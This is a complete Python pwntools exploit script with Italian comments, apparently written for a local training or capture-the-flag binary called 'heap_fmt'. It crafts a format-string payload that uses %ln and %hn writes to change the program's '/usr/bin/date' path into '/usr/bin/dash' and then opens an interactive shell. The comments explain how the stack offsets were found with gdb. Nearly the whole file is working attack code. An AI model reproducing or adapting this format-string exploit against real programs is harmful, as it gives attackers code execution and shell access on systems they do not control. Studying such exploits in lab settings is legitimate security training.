from pwn import *
from pwn import u16

def main():
    e = ELF('../Machines/heap_fmt')
    p = process(e.path)
    #context.update(arch='amd64', os='linux') #È fondamentale specificare il contesto, ovvero l'architettura e il sistema operativo dell'elf
    #Se non si ha la sicurezza del contesto basta riferirsi a quello dell'eseguibile con: 
    context.binary = e

    #Creazione del payload: analizzando lo stack e gli indirizzi stampati con l'inserimento manuale di
    # una sequenza di %p %p... Si comprende che l'indirizzo con offset pari a 6 in realtà punta ad un
    # altro indirizzo nello stack. Verrà "sovrascitto" (tramite %n) tale indirizzo con quello dell'indirizzo del target,
    # ovvero date_path. Inoltre, modificando i dati di tale indirizzo in realtà si staranno
    # cambiando i dati all'interno dell'indirizzo puntato. Viene quindi cambiato 'te' in 'sh' nell'indirizzo
    # puntato da quello con offset 6 (l'indirizzo puntato ha offset 34, analizzando lo stack con gdb)
    payload = "%c"*4
    payload += "%{}c".format(e.sym.date_path + 11 - 4) # /usr/bin/date --> /usr/bin/dash
    payload += "%ln"
    payload += "%{}c".format((u16(b"sh") - e.sym.date_path - 11) % (2**16))
    payload += "%34$hn"
    
    p.sendline(payload.encode())
    p.recvline()
    p.recvline()
    p.recvline()
    p.interactive()


if __name__ == '__main__':
    main()